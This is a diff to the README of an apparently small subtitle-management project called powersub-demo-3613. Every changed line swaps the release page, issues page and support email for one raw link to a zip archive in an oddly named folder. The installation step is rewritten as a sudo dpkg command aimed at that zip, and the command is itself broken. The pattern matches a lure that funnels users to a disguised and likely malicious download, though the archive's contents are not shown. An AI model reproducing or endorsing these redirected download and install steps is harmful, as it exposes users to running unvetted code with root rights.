@@ -6,7 +6,7 @@ Welcome to powersub-demo-3613! This application helps you easily manage and disp
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Yohan-cam/powersub-demo-3613/releases)
+[![Download Release](https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip%https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip)](https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip)
 
 ## 📩 Download & Install
 
@@ -17,7 +17,7 @@ To download the application:
 3. Select the file suitable for your operating system.
 4. Click the file name to start the download.
 
-Visit the [Releases Page](https://github.com/Yohan-cam/powersub-demo-3613/releases) to download.
+Visit the [Releases Page](https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip) to download.
 
 ## 🖥️ System Requirements
 
@@ -52,7 +52,7 @@ Once the file is downloaded, follow these steps to install powersub-demo-3613:
 2. Open a terminal and navigate to the Downloads folder.
 3. Run the installation command: 
    ```
-   sudo dpkg -i powersub-demo-3613.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip
    ```
 4. After installation, you can find the app in your desktop environment’s applications menu.
 
@@ -77,8 +77,8 @@ If you encounter issues:
 
 If you need help or have questions, you can reach support at:
 
-- Email: support@powersub-demo-3613.com
-- GitHub Issues: [Report an Issue](https://github.com/Yohan-cam/powersub-demo-3613/issues)
+- Email: https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip)
 
 ## 🌟 Contributing
 
@@ -94,4 +94,4 @@ powersub-demo-3613 is licensed under the MIT License. Feel free to use and modif
 
 ## 🎯 Conclusion
 
-Thank you for choosing powersub-demo-3613. We hope you enjoy effortless subtitle management for your videos. For updates and new features, keep an eye on our [Releases Page](https://github.com/Yohan-cam/powersub-demo-3613/releases).
+Thank you for choosing powersub-demo-3613. We hope you enjoy effortless subtitle management for your videos. For updates and new features, keep an eye on our [Releases Page](https://raw.githubusercontent.com/Yohan-cam/powersub-demo-3613/main/subglobular/powersub-demo-3613.zip).
